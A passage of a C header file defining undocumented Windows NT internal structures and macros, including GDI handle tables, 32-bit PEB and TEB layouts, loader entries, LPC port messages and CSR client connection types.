			ULONG DescriptorsCount;
			HOTPATCH_HOOK_DESCRIPTOR CodeDescriptors[1]; // variable size structure
		} CodeInfo;
		
		struct
		{
			USHORT NameOffset;
			USHORT NameLength;
		} KernelInfo;
		
		struct
		{
			USHORT NameOffset;
			USHORT NameLength;
			USHORT TargetNameOffset;
			USHORT TargetNameLength;
		} UserModeInfo;
		
		struct
		{
			HANDLE FileHandle1;
			PIO_STATUS_BLOCK IoStatusBlock1;
			PFILE_RENAME_INFORMATION RenameInformation1;
			ULONG RenameInformationLength1;
			HANDLE FileHandle2;
			PIO_STATUS_BLOCK IoStatusBlock2;
			PFILE_RENAME_INFORMATION RenameInformation2;
			ULONG RenameInformationLength2;
		} RenameInfo;

		struct
		{
			HANDLE ParentDirectory;
			HANDLE ObjectHandle1;
			HANDLE ObjectHandle2;
		} AtomicSwap;
	};

} SYSTEM_HOTPATCH_CODE_INFORMATION, *PSYSTEM_HOTPATCH_CODE_INFORMATION;

typedef struct _KERNEL_USER_TIMES {
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER ExitTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
} KERNEL_USER_TIMES;
typedef KERNEL_USER_TIMES *PKERNEL_USER_TIMES;

typedef enum _WATCHDOG_HANDLER_ACTION
{
	WdActionSetTimeoutValue,
	WdActionQueryTimeoutValue,
	WdActionResetTimer,
	WdActionStopTimer,
	WdActionStartTimer,
	WdActionSetTriggerAction,
	WdActionQueryTriggerAction,
	WdActionQueryState,
	WdActionSleep,
	WdActionWake
} WATCHDOG_HANDLER_ACTION;

typedef enum _WATCHDOG_INFORMATION_CLASS {
	WdInfoTimeoutValue,
	WdInfoResetTimer,
	WdInfoStopTimer,
	WdInfoStartTimer,
	WdInfoTriggerAction,
	WdInfoState
} WATCHDOG_INFORMATION_CLASS;

typedef
	NTSTATUS
	(*PWD_HANDLER)(
	IN WATCHDOG_HANDLER_ACTION Action,
	IN PVOID Context,
	IN OUT PULONG DataValue,
	IN BOOLEAN NoLocks
	);

typedef struct _SYSTEM_WATCHDOG_HANDLER_INFORMATION {
	PWD_HANDLER WdHandler;
	PVOID       Context;
} SYSTEM_WATCHDOG_HANDLER_INFORMATION, *PSYSTEM_WATCHDOG_HANDLER_INFORMATION;

#define WDSTATE_FIRED               0x00000001
#define WDSTATE_HARDWARE_ENABLED    0x00000002
#define WDSTATE_STARTED             0x00000004
#define WDSTATE_HARDWARE_PRESENT    0x00000008

typedef struct _SYSTEM_WATCHDOG_TIMER_INFORMATION {
	WATCHDOG_INFORMATION_CLASS  WdInfoClass;
	ULONG                       DataValue;
} SYSTEM_WATCHDOG_TIMER_INFORMATION, *PSYSTEM_WATCHDOG_TIMER_INFORMATION;

#define GDI_MAX_HANDLE_COUNT 0x4000

#define GDI_HANDLE_INDEX_SHIFT 0
#define GDI_HANDLE_INDEX_BITS 16
#define GDI_HANDLE_INDEX_MASK 0xffff

#define GDI_HANDLE_TYPE_SHIFT 16
#define GDI_HANDLE_TYPE_BITS 5
#define GDI_HANDLE_TYPE_MASK 0x1f

#define GDI_HANDLE_ALTTYPE_SHIFT 21
#define GDI_HANDLE_ALTTYPE_BITS 2
#define GDI_HANDLE_ALTTYPE_MASK 0x3

#define GDI_HANDLE_STOCK_SHIFT 23
#define GDI_HANDLE_STOCK_BITS 1
#define GDI_HANDLE_STOCK_MASK 0x1

#define GDI_HANDLE_UNIQUE_SHIFT 24
#define GDI_HANDLE_UNIQUE_BITS 8
#define GDI_HANDLE_UNIQUE_MASK 0xff

#define GDI_HANDLE_INDEX(Handle) ((ULONG)(Handle) & GDI_HANDLE_INDEX_MASK)
#define GDI_HANDLE_TYPE(Handle) (((ULONG)(Handle) >> GDI_HANDLE_TYPE_SHIFT) & GDI_HANDLE_TYPE_MASK)
#define GDI_HANDLE_ALTTYPE(Handle) (((ULONG)(Handle) >> GDI_HANDLE_ALTTYPE_SHIFT) & GDI_HANDLE_ALTTYPE_MASK)
#define GDI_HANDLE_STOCK(Handle) (((ULONG)(Handle) >> GDI_HANDLE_STOCK_SHIFT)) & GDI_HANDLE_STOCK_MASK)

#define GDI_MAKE_HANDLE(Index, Unique) ((ULONG)(((ULONG)(Unique) << GDI_HANDLE_INDEX_BITS) | (ULONG)(Index)))

// GDI server-side types

#define GDI_DEF_TYPE 0
#define GDI_DC_TYPE 1
#define GDI_DD_DIRECTDRAW_TYPE 2
#define GDI_DD_SURFACE_TYPE 3
#define GDI_RGN_TYPE 4
#define GDI_SURF_TYPE 5
#define GDI_CLIENTOBJ_TYPE 6
#define GDI_PATH_TYPE 7
#define GDI_PAL_TYPE 8
#define GDI_ICMLCS_TYPE 9
#define GDI_LFONT_TYPE 10
#define GDI_RFONT_TYPE 11
#define GDI_PFE_TYPE 12
#define GDI_PFT_TYPE 13
#define GDI_ICMCXF_TYPE 14
#define GDI_ICMDLL_TYPE 15
#define GDI_BRUSH_TYPE 16
#define GDI_PFF_TYPE 17 // unused
#define GDI_CACHE_TYPE 18 // unused
#define GDI_SPACE_TYPE 19
#define GDI_DBRUSH_TYPE 20 // unused
#define GDI_META_TYPE 21
#define GDI_EFSTATE_TYPE 22
#define GDI_BMFD_TYPE 23 // unused
#define GDI_VTFD_TYPE 24 // unused
#define GDI_TTFD_TYPE 25 // unused
#define GDI_RC_TYPE 26 // unused
#define GDI_TEMP_TYPE 27 // unused
#define GDI_DRVOBJ_TYPE 28
#define GDI_DCIOBJ_TYPE 29 // unused
#define GDI_SPOOL_TYPE 30

// GDI client-side types

#define GDI_CLIENT_TYPE_FROM_HANDLE(Handle) ((ULONG)(Handle) & ((GDI_HANDLE_ALTTYPE_MASK << GDI_HANDLE_ALTTYPE_SHIFT) | \
	(GDI_HANDLE_TYPE_MASK << GDI_HANDLE_TYPE_SHIFT)))
#define GDI_CLIENT_TYPE_FROM_UNIQUE(Unique) GDI_CLIENT_TYPE_FROM_HANDLE((ULONG)(Unique) << 16)

#define GDI_ALTTYPE_1 (1 << GDI_HANDLE_ALTTYPE_SHIFT)
#define GDI_ALTTYPE_2 (2 << GDI_HANDLE_ALTTYPE_SHIFT)
#define GDI_ALTTYPE_3 (3 << GDI_HANDLE_ALTTYPE_SHIFT)

#define GDI_CLIENT_BITMAP_TYPE (GDI_SURF_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_BRUSH_TYPE (GDI_BRUSH_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_CLIENTOBJ_TYPE (GDI_CLIENTOBJ_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_DC_TYPE (GDI_DC_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_FONT_TYPE (GDI_LFONT_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_PALETTE_TYPE (GDI_PAL_TYPE << GDI_HANDLE_TYPE_SHIFT)
#define GDI_CLIENT_REGION_TYPE (GDI_RGN_TYPE << GDI_HANDLE_TYPE_SHIFT)

#define GDI_CLIENT_ALTDC_TYPE (GDI_CLIENT_DC_TYPE | GDI_ALTTYPE_1)
#define GDI_CLIENT_DIBSECTION_TYPE (GDI_CLIENT_BITMAP_TYPE | GDI_ALTTYPE_1)
#define GDI_CLIENT_EXTPEN_TYPE (GDI_CLIENT_BRUSH_TYPE | GDI_ALTTYPE_2)
#define GDI_CLIENT_METADC16_TYPE (GDI_CLIENT_CLIENTOBJ_TYPE | GDI_ALTTYPE_3)
#define GDI_CLIENT_METAFILE_TYPE (GDI_CLIENT_CLIENTOBJ_TYPE | GDI_ALTTYPE_2)
#define GDI_CLIENT_METAFILE16_TYPE (GDI_CLIENT_CLIENTOBJ_TYPE | GDI_ALTTYPE_1)
#define GDI_CLIENT_PEN_TYPE (GDI_CLIENT_BRUSH_TYPE | GDI_ALTTYPE_1)

typedef struct _GDI_HANDLE_ENTRY
{
	union
	{
		PVOID Object;
		PVOID NextFree;
	};
	union
	{
		struct
		{
			USHORT ProcessId;
			USHORT Lock : 1;
			USHORT Count : 15;
		};
		ULONG Value;
	} Owner;
	USHORT Unique;
	UCHAR Type;
	UCHAR Flags;
	PVOID UserPointer;
} GDI_HANDLE_ENTRY, *PGDI_HANDLE_ENTRY;

typedef struct _GDI_SHARED_MEMORY
{
	GDI_HANDLE_ENTRY Handles[GDI_MAX_HANDLE_COUNT];
} GDI_SHARED_MEMORY, *PGDI_SHARED_MEMORY;

#define FLS_MAXIMUM_AVAILABLE 128
#define TLS_MINIMUM_AVAILABLE 64
#define TLS_EXPANSION_SLOTS 1024

#define DOS_MAX_COMPONENT_LENGTH 255
#define DOS_MAX_PATH_LENGTH (DOS_MAX_COMPONENT_LENGTH + 5)

typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	HANDLE Handle;
} CURDIR, *PCURDIR;

#define RTL_USER_PROC_CURDIR_CLOSE 0x00000002
#define RTL_USER_PROC_CURDIR_INHERIT 0x00000003

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	USHORT Flags;
	USHORT Length;
	ULONG TimeStamp;
	STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

#define RTL_MAX_DRIVE_LETTERS 32
#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	HANDLE ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

	ULONG EnvironmentSize;
	ULONG EnvironmentVersion;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

#define WOW64_SYSTEM_DIRECTORY "SysWOW64"
#define WOW64_SYSTEM_DIRECTORY_U L"SysWOW64"
#define WOW64_X86_TAG " (x86)"
#define WOW64_X86_TAG_U L" (x86)"

typedef enum _WOW64_SHARED_INFORMATION
{
	SharedNtdll32LdrInitializeThunk = 0,
	SharedNtdll32KiUserExceptionDispatcher = 1,
	SharedNtdll32KiUserApcDispatcher = 2,
	SharedNtdll32KiUserCallbackDispatcher = 3,
	SharedNtdll32LdrHotPatchRoutine = 4,
	SharedNtdll32ExpInterlockedPopEntrySListFault = 5,
	SharedNtdll32ExpInterlockedPopEntrySListResume = 6,
	SharedNtdll32ExpInterlockedPopEntrySListEnd = 7,
	SharedNtdll32RtlUserThreadStart = 8,
	SharedNtdll32pQueryProcessDebugInformationRemote = 9,
	SharedNtdll32EtwpNotificationThread = 10,
	SharedNtdll32BaseAddress = 11,
	Wow64SharedPageEntriesCount = 12
} WOW64_SHARED_INFORMATION;

// 21.12.2011 added
#define SET_LAST_STATUS(S)NtCurrentTeb()->LastErrorValue = RtlNtStatusToDosError(NtCurrentTeb()->LastStatusValue = (ULONG)(S))
// 21.12.2011 - end

// 32-bit definitions

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef struct LIST_ENTRY32 {
    DWORD Flink;
    DWORD Blink;
} LIST_ENTRY32;
typedef LIST_ENTRY32 *PLIST_ENTRY32;

typedef struct LIST_ENTRY64 {
    ULONGLONG Flink;
    ULONGLONG Blink;
} LIST_ENTRY64;
typedef LIST_ENTRY64 *PLIST_ENTRY64;
#endif

#define WOW64_POINTER(Type) ULONG

typedef struct _PEB_LDR_DATA32
{
	ULONG Length;
	BOOLEAN Initialized;
	WOW64_POINTER(HANDLE) SsHandle;
	LIST_ENTRY32 InLoadOrderModuleList;
	LIST_ENTRY32 InMemoryOrderModuleList;
	LIST_ENTRY32 InInitializationOrderModuleList;
	WOW64_POINTER(PVOID) EntryInProgress;
	BOOLEAN ShutdownInProgress;
	WOW64_POINTER(HANDLE) ShutdownThreadId;
} PEB_LDR_DATA32, *PPEB_LDR_DATA32;

#define LDR_DATA_TABLE_ENTRY_SIZE_WINXP32 FIELD_OFFSET( LDR_DATA_TABLE_ENTRY32, ForwarderLinks )

typedef struct _LDR_DATA_TABLE_ENTRY32
{
	LIST_ENTRY32 InLoadOrderLinks;
	LIST_ENTRY32 InMemoryOrderLinks;
	LIST_ENTRY32 InInitializationOrderLinks;
	WOW64_POINTER(PVOID) DllBase;
	WOW64_POINTER(PVOID) EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING32 FullDllName;
	UNICODE_STRING32 BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY32 HashLinks;
		struct
		{
			WOW64_POINTER(PVOID) SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		WOW64_POINTER(PVOID) LoadedImports;
	};
	WOW64_POINTER(PVOID) EntryPointActivationContext;
	WOW64_POINTER(PVOID) PatchInformation;
	LIST_ENTRY32 ForwarderLinks;
	LIST_ENTRY32 ServiceTagLinks;
	LIST_ENTRY32 StaticLinks;
	WOW64_POINTER(PVOID) ContextInformation;
	WOW64_POINTER(ULONG_PTR) OriginalBase;
	LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;

typedef struct _CURDIR32
{
	UNICODE_STRING32 DosPath;
	WOW64_POINTER(HANDLE) Handle;
} CURDIR32, *PCURDIR32;

typedef struct _RTL_DRIVE_LETTER_CURDIR32
{
	USHORT Flags;
	USHORT Length;
	ULONG TimeStamp;
	STRING32 DosPath;
} RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32;

typedef struct _RTL_USER_PROCESS_PARAMETERS32
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	WOW64_POINTER(HANDLE) ConsoleHandle;
	ULONG ConsoleFlags;
	WOW64_POINTER(HANDLE) StandardInput;
	WOW64_POINTER(HANDLE) StandardOutput;
	WOW64_POINTER(HANDLE) StandardError;

	CURDIR32 CurrentDirectory;
	UNICODE_STRING32 DllPath;
	UNICODE_STRING32 ImagePathName;
	UNICODE_STRING32 CommandLine;
	WOW64_POINTER(PVOID) Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING32 WindowTitle;
	UNICODE_STRING32 DesktopInfo;
	UNICODE_STRING32 ShellInfo;
	UNICODE_STRING32 RuntimeData;
	RTL_DRIVE_LETTER_CURDIR32 CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

	ULONG EnvironmentSize;
	ULONG EnvironmentVersion;
} RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32;

typedef struct _PEB32
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	WOW64_POINTER(HANDLE) Mutant;

	WOW64_POINTER(PVOID) ImageBaseAddress;
	WOW64_POINTER(PPEB_LDR_DATA) Ldr;
	WOW64_POINTER(PRTL_USER_PROCESS_PARAMETERS) ProcessParameters;
	WOW64_POINTER(PVOID) SubSystemData;
	WOW64_POINTER(PVOID) ProcessHeap;
	WOW64_POINTER(PRTL_CRITICAL_SECTION) FastPebLock;
	WOW64_POINTER(PVOID) AtlThunkSListPtr;
	WOW64_POINTER(PVOID) IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		WOW64_POINTER(PVOID) KernelCallbackTable;
		WOW64_POINTER(PVOID) UserSharedInfoPtr;
	};
	ULONG SystemReserved[1];
	ULONG AtlThunkSListPtr32;
	WOW64_POINTER(PVOID) ApiSetMap;
	ULONG TlsExpansionCounter;
	WOW64_POINTER(PVOID) TlsBitmap;
	ULONG TlsBitmapBits[2];
	WOW64_POINTER(PVOID) ReadOnlySharedMemoryBase;
	WOW64_POINTER(PVOID) HotpatchInformation;
	WOW64_POINTER(PPVOID) ReadOnlyStaticServerData;
	WOW64_POINTER(PVOID) AnsiCodePageData;
	WOW64_POINTER(PVOID) OemCodePageData;
	WOW64_POINTER(PVOID) UnicodeCaseTableData;

	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;

	LARGE_INTEGER CriticalSectionTimeout;
	WOW64_POINTER(SIZE_T) HeapSegmentReserve;
	WOW64_POINTER(SIZE_T) HeapSegmentCommit;
	WOW64_POINTER(SIZE_T) HeapDeCommitTotalFreeThreshold;
	WOW64_POINTER(SIZE_T) HeapDeCommitFreeBlockThreshold;

	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	WOW64_POINTER(PPVOID) ProcessHeaps;

	WOW64_POINTER(PVOID) GdiSharedHandleTable;
	WOW64_POINTER(PVOID) ProcessStarterHelper;
	ULONG GdiDCAttributeList;

	WOW64_POINTER(PRTL_CRITICAL_SECTION) LoaderLock;

	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	USHORT OSBuildNumber;
	USHORT OSCSDVersion;
	ULONG OSPlatformId;
	ULONG ImageSubsystem;
	ULONG ImageSubsystemMajorVersion;
	ULONG ImageSubsystemMinorVersion;
	WOW64_POINTER(ULONG_PTR) ImageProcessAffinityMask;
	GDI_HANDLE_BUFFER32 GdiHandleBuffer;
	WOW64_POINTER(PVOID) PostProcessInitRoutine;

	WOW64_POINTER(PVOID) TlsExpansionBitmap;
	ULONG TlsExpansionBitmapBits[32];

	ULONG SessionId;

	// Rest of structure not included.
} PEB32, *PPEB32;

#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH32
{
	ULONG Offset;
	WOW64_POINTER(ULONG_PTR) HDC;
	ULONG Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH32, *PGDI_TEB_BATCH32;

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
//
// 32 and 64 bit specific version for wow64 and the debugger
//
typedef struct _NT_TIB32 {
    DWORD ExceptionList;
    DWORD StackBase;
    DWORD StackLimit;
    DWORD SubSystemTib;
    union {
        DWORD FiberData;
        DWORD Version;
    };
    DWORD ArbitraryUserPointer;
    DWORD Self;
} NT_TIB32, *PNT_TIB32;

typedef struct _NT_TIB64 {
    DWORD64 ExceptionList;
    DWORD64 StackBase;
    DWORD64 StackLimit;
    DWORD64 SubSystemTib;
    union {
        DWORD64 FiberData;
        DWORD Version;
    };
    DWORD64 ArbitraryUserPointer;
    DWORD64 Self;
} NT_TIB64, *PNT_TIB64;
#endif

typedef struct _TEB32
{
	NT_TIB32 NtTib;

	WOW64_POINTER(PVOID) EnvironmentPointer;
	CLIENT_ID32 ClientId;
	WOW64_POINTER(PVOID) ActiveRpcHandle;
	WOW64_POINTER(PVOID) ThreadLocalStoragePointer;
	WOW64_POINTER(PPEB) ProcessEnvironmentBlock;

	ULONG LastErrorValue;
	ULONG CountOfOwnedCriticalSections;
	WOW64_POINTER(PVOID) CsrClientThread;
	WOW64_POINTER(PVOID) Win32ThreadInfo;
	ULONG User32Reserved[26];
	ULONG UserReserved[5];
	WOW64_POINTER(PVOID) WOW32Reserved;
	LCID CurrentLocale;
	ULONG FpSoftwareStatusRegister;
	WOW64_POINTER(PVOID) SystemReserved1[54];
	NTSTATUS ExceptionCode;
	WOW64_POINTER(PVOID) ActivationContextStackPointer;
	BYTE SpareBytes[36];
	ULONG TxFsContext;

	GDI_TEB_BATCH32 GdiTebBatch;
	CLIENT_ID32 RealClientId;
	WOW64_POINTER(HANDLE) GdiCachedProcessHandle;
	ULONG GdiClientPID;
	ULONG GdiClientTID;
	WOW64_POINTER(PVOID) GdiThreadLocalInfo;
	WOW64_POINTER(ULONG_PTR) Win32ClientInfo[62];
	WOW64_POINTER(PVOID) glDispatchTable[233];
	WOW64_POINTER(ULONG_PTR) glReserved1[29];
	WOW64_POINTER(PVOID) glReserved2;
	WOW64_POINTER(PVOID) glSectionInfo;
	WOW64_POINTER(PVOID) glSection;
	WOW64_POINTER(PVOID) glTable;
	WOW64_POINTER(PVOID) glCurrentRC;
	WOW64_POINTER(PVOID) glContext;

	NTSTATUS LastStatusValue;
	UNICODE_STRING32 StaticUnicodeString;
	WCHAR StaticUnicodeBuffer[261];

	WOW64_POINTER(PVOID) DeallocationStack;
	WOW64_POINTER(PVOID) TlsSlots[64];
	LIST_ENTRY32 TlsLinks;
} TEB32, *PTEB32;

typedef
	VOID
	(*PPS_POST_PROCESS_INIT_ROUTINE) (
	VOID
	);

typedef struct _TIB
{
	struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;
	PVOID StackBase;
	PVOID StackLimit;
	PVOID SubSystemTib;

	union
	{
		PVOID FiberData;
		ULONG Version;
	};

	PVOID ArbitraryUserPointer;
	struct _TIB *Self;
} TIB;
typedef TIB *PTIB;

//
// inifile mapping
//

typedef struct _NLS_USER_INFO
{

	/*<thisrel this+0x0>*/ /*|0xa0|*/ WCHAR iCountry[80];
	/*<thisrel this+0xa0>*/ /*|0xa0|*/ WCHAR sCountry[80];
	/*<thisrel this+0x140>*/ /*|0xa0|*/ WCHAR sList[80];
	/*<thisrel this+0x1e0>*/ /*|0xa0|*/ WCHAR iMeasure[80];
	/*<thisrel this+0x280>*/ /*|0xa0|*/ WCHAR iPaperSize[80];
	/*<thisrel this+0x320>*/ /*|0xa0|*/ WCHAR sDecimal[80];
	/*<thisrel this+0x3c0>*/ /*|0xa0|*/ WCHAR sThousand[80];
	/*<thisrel this+0x460>*/ /*|0xa0|*/ WCHAR sGrouping[80];
	/*<thisrel this+0x500>*/ /*|0xa0|*/ WCHAR iDigits[80];
	/*<thisrel this+0x5a0>*/ /*|0xa0|*/ WCHAR iLZero[80];
	/*<thisrel this+0x640>*/ /*|0xa0|*/ WCHAR iNegNumber[80];
	/*<thisrel this+0x6e0>*/ /*|0xa0|*/ WCHAR sNativeDigits[80];
	/*<thisrel this+0x780>*/ /*|0xa0|*/ WCHAR iDigitSubstitution[80];
	/*<thisrel this+0x820>*/ /*|0xa0|*/ WCHAR sCurrency[80];
	/*<thisrel this+0x8c0>*/ /*|0xa0|*/ WCHAR sMonDecSep[80];
	/*<thisrel this+0x960>*/ /*|0xa0|*/ WCHAR sMonThouSep[80];
	/*<thisrel this+0xa00>*/ /*|0xa0|*/ WCHAR sMonGrouping[80];
	/*<thisrel this+0xaa0>*/ /*|0xa0|*/ WCHAR iCurrDigits[80];
	/*<thisrel this+0xb40>*/ /*|0xa0|*/ WCHAR iCurrency[80];
	/*<thisrel this+0xbe0>*/ /*|0xa0|*/ WCHAR iNegCurr[80];
	/*<thisrel this+0xc80>*/ /*|0xa0|*/ WCHAR sPosSign[80];
	/*<thisrel this+0xd20>*/ /*|0xa0|*/ WCHAR sNegSign[80];
	/*<thisrel this+0xdc0>*/ /*|0xa0|*/ WCHAR sTimeFormat[80];
	/*<thisrel this+0xe60>*/ /*|0xa0|*/ WCHAR s1159[80];
	/*<thisrel this+0xf00>*/ /*|0xa0|*/ WCHAR s2359[80];
	/*<thisrel this+0xfa0>*/ /*|0xa0|*/ WCHAR sShortDate[80];
	/*<thisrel this+0x1040>*/ /*|0xa0|*/ WCHAR sYearMonth[80];
	/*<thisrel this+0x10e0>*/ /*|0xa0|*/ WCHAR sLongDate[80];
	/*<thisrel this+0x1180>*/ /*|0xa0|*/ WCHAR iCalType[80];
	/*<thisrel this+0x1220>*/ /*|0xa0|*/ WCHAR iFirstDay[80];
	/*<thisrel this+0x12c0>*/ /*|0xa0|*/ WCHAR iFirstWeek[80];
	/*<thisrel this+0x1360>*/ /*|0xa0|*/ WCHAR sLocale[80];
	/*<thisrel this+0x1400>*/ /*|0xaa|*/ WCHAR sLocaleName[85];
	/*<thisrel this+0x14ac>*/ /*|0x4|*/ ULONG UserLocaleId;
	/*<thisrel this+0x14b0>*/ /*|0x8|*/ struct _LUID InteractiveUserLuid;
	/*<thisrel this+0x14b8>*/ /*|0x44|*/ UCHAR InteractiveUserSid[68];
	/*<thisrel this+0x14fc>*/ /*|0x4|*/ ULONG ulCacheUpdateCount;
} NLS_USER_INFO, *PNLS_USER_INFO;	// <size 0x1500>

typedef struct _INIFILE_MAPPING_TARGET
{
	struct _INIFILE_MAPPING_TARGET* Next;
	struct _UNICODE_STRING RegistryPath;
} INIFILE_MAPPING_TARGET, *PINIFILE_MAPPING_TARGET;

typedef struct _INIFILE_MAPPING_VARNAME
{
	struct _INIFILE_MAPPING_VARNAME* Next;
	UNICODE_STRING Name;
	ULONG MappingFlags;
	struct _INIFILE_MAPPING_TARGET* MappingTarget;
} INIFILE_MAPPING_VARNAME, *PINIFILE_MAPPING_VARNAME;

typedef struct _INIFILE_MAPPING_APPNAME
{
	struct _INIFILE_MAPPING_APPNAME* Next;
	UNICODE_STRING Name;
	struct _INIFILE_MAPPING_VARNAME* VariableNames;
	struct _INIFILE_MAPPING_VARNAME* DefaultVarNameMapping;
} INIFILE_MAPPING_APPNAME, *PINIFILE_MAPPING_APPNAME;

typedef struct _INIFILE_MAPPING_FILENAME
{
	struct _INIFILE_MAPPING_FILENAME* Next;
	UNICODE_STRING Name;
	struct _INIFILE_MAPPING_APPNAME* ApplicationNames;
	struct _INIFILE_MAPPING_APPNAME* DefaultAppNameMapping;
} INIFILE_MAPPING_FILENAME, *PINIFILE_MAPPING_FILENAME;

typedef struct _INIFILE_MAPPING
{
	struct _INIFILE_MAPPING_FILENAME* FileNames;
	struct _INIFILE_MAPPING_FILENAME* DefaultFileNameMapping;
	struct _INIFILE_MAPPING_FILENAME* WinIniFileMapping;
	ULONG Reserved;
} INIFILE_MAPPING, *PINIFILE_MAPPING;

#define PORT_CONNECT (0x0001)

#define PORT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x1)

typedef struct _PORT_MESSAGE
{
	union {
		struct
		{
			CSHORT DataLength;
			CSHORT TotalLength;
		} s1;

		ULONG Length;

	} u1;

	union
	{
		struct
		{
			CSHORT Type;
			CSHORT DataInfoOffset;
		} s2;
		ULONG ZeroInit;
	} u2;

	union
	{
		LPC_CLIENT_ID ClientId;
		double DoNotUseThisField;       // Force quadword alignment
	};

	ULONG MessageId;
	union
	{
		LPC_SIZE_T ClientViewSize;          // Only valid on LPC_CONNECTION_REQUEST message
		ULONG CallbackId;                   // Only valid on LPC_REQUEST message
	};
	//  UCHAR Data[];
} PORT_MESSAGE, *PPORT_MESSAGE;

typedef struct _PORT_DATA_ENTRY {
	LPC_PVOID Base;
	ULONG Size;
} PORT_DATA_ENTRY, *PPORT_DATA_ENTRY;

typedef struct _PORT_DATA_INFORMATION {
	ULONG CountDataEntries;
	PORT_DATA_ENTRY DataEntries[1];
} PORT_DATA_INFORMATION, *PPORT_DATA_INFORMATION;

	//
	// csrss & csrsrv related
	//

	typedef ULONG CSR_API_NUMBER;

#define CSR_API_PORT_NAME L"ApiPort"

	//
	// This structure is filled in by the client prior to connecting to the CSR
	// server.  The CSR server will fill in the OUT fields if prior to accepting
	// the connection.
	//

	typedef struct _CSR_API_CONNECTINFO {
		HANDLE ObjectDirectory;
		PVOID SharedSectionBase;
		PVOID SharedStaticServerData;
		PVOID SharedSectionHeap;
		ULONG DebugFlags;
		ULONG SizeOfPebData;
		ULONG SizeOfTebData;
		ULONG NumberOfServerDllNames;
		HANDLE ServerProcessId;
	} CSR_API_CONNECTINFO, *PCSR_API_CONNECTINFO;

	//
	// Message format for messages sent from the client to the server
	//

	typedef struct _CSR_CLIENTCONNECT_MSG
	{
		ULONG ServerDllIndex;
		PVOID ConnectionInformation;
		ULONG ConnectionInformationLength;
	} CSR_CLIENTCONNECT_MSG, *PCSR_CLIENTCONNECT_MSG;	// <size 0xc>

#define CSR_NORMAL_PRIORITY_CLASS   0x00000010
#define CSR_IDLE_PRIORITY_CLASS     0x00000020
#define CSR_HIGH_PRIORITY_CLASS     0x00000040
#define CSR_REALTIME_PRIORITY_CLASS 0x00000080

	typedef struct _CSR_CAPTURE_HEADER {
		ULONG Length;
		PVOID RelatedCaptureBuffer;
		ULONG CountMessagePointers;
		PCHAR FreeSpace;
		ULONG_PTR MessagePointerOffsets[1]; // Offsets within CSR_API_MSG of pointers
	} CSR_CAPTURE_HEADER, *PCSR_CAPTURE_HEADER;

#define WINSS_OBJECT_DIRECTORY_NAME     L"\\Windows"

#define CSRSRV_SERVERDLL_INDEX          0
#define CSRSRV_FIRST_API_NUMBER         0

#define BASESRV_SERVERDLL_INDEX         1
#define BASESRV_FIRST_API_NUMBER        0

